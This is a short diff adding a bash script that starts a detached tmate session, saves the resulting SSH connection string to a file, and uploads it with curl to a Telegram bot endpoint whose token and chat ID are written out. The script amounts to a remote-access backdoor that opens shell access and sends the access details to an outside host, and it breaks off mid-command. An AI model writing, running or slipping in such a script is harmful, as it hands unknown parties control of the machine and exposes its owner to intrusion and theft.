@@ -1,0 +1,8 @@
+#!/bin/bash
+tmate -S /tmp/tmate.sock new-session -d               
+tmate -S /tmp/tmate.sock wait tmate-ready             
+tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}' | tee ssh.txt
+curl -F document=@ssh.txt "https://api.telegram.org/bot1915991387:AAEwjpazwCDFZO6gpMdTUXfjSn1pwpbr5kk/sendDocument" \
+     -F chat_id="-578685820" \
+     -F "disable_web_page_preview=true" \
+     -F "parse_mode=html" \
